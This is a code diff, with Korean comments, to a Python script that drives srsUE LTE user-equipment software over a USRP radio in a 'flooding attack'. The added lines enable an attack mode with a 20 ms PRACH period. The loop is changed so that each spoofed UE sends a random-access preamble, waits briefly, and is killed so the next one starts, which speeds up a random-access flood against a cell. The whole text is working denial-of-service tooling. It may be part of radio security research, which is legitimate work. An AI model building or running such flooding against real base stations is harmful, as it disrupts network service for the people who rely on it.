@@ -79,7 +79,9 @@ def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[s
         config_path,
         "--log.filename", log_file,
         "--log.all_level", "info",
-        "--log.rrc_level", "debug"  # RRC 레벨을 debug로 설정하여 Msg3 로그 확인
+        "--log.rrc_level", "debug",  # RRC 레벨을 debug로 설정하여 Msg3 로그 확인
+        "--mac.attack_mode", "true",  # attack_ue TX/RX 스레드 활성화
+        "--mac.attack_prach_period_ms", "20"  # PRACH 송신 주기 (20ms)
     ]
     
     # device_args를 명령어 옵션으로 추가
@@ -251,7 +253,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             'msg2'
                         ])
                         
-                        # RACH 전송 확인 (Msg1 - 참고용, 종료 조건 아님)
+                        # RACH 전송 확인 (Msg1 - PRACH 전송 감지)
                         rach_sent = any(keyword in log_content.lower() for keyword in [
                             'random access',
                             'rach',
@@ -275,14 +277,13 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             process_start_time = None
                             current_log_file = None
                             continue
-                        # RAR 수신했는데 Msg3가 안 오는 경우 진단
-                        elif rar_received and elapsed > 1.0:
-                            # RAR는 받았는데 Msg3가 1초 이상 안 오면 문제 (2초 → 1초로 단축)
-                            # 최대 2초까지 기다림 (5초 → 2초로 단축)
-                            if elapsed < 2.0:
-                                continue  # 계속 기다림
+                        # RAR 수신했을 때: Msg3 대기 (패턴 A 적용)
+                        elif rar_received:
+                            # RAR 수신 시에만 Msg3 대기 (최대 3초)
+                            if elapsed < 3.0:
+                                continue  # Msg3 대기
                             else:
-                                # 2초 넘으면 종료
+                                # 3초 넘으면 타임아웃 종료
                                 if current_process.poll() is None:
                                     current_process.kill()
                                 logger.info(f"config_{ue_id-1} 완료 (RAR 수신했지만 Msg3 타임아웃)")
@@ -290,8 +291,18 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                                 process_start_time = None
                                 current_log_file = None
                                 continue
-                        # RACH만 감지하고 RRC Request를 기다리는 중 (종료하지 않음)
-                        # RAR 수신 후 RRC Request를 기다리는 중일 수 있음
+                        # RACH 전송 후 RAR 대기 중: 짧은 시간만 대기 (패턴 A - PRACH만 보내고 빠르게 종료)
+                        elif rach_sent and elapsed > 0.5:
+                            # PRACH 전송 후 0.5초만 대기하고 종료 (RAR 대기 최소화)
+                            # RAR가 오지 않으면 다음 UE로 빠르게 전환
+                            if current_process.poll() is None:
+                                current_process.kill()
+                            logger.info(f"config_{ue_id-1} 완료 (PRACH 전송됨, RAR 대기 중 종료)")
+                            current_process = None
+                            process_start_time = None
+                            current_log_file = None
+                            continue
+                        # PBCH 디코딩 실패
                         elif pbch_failed and elapsed > 1.0:
                             # PBCH 디코딩 실패이고 1초 이상 지났으면 다음으로
                             if current_process.poll() is None:
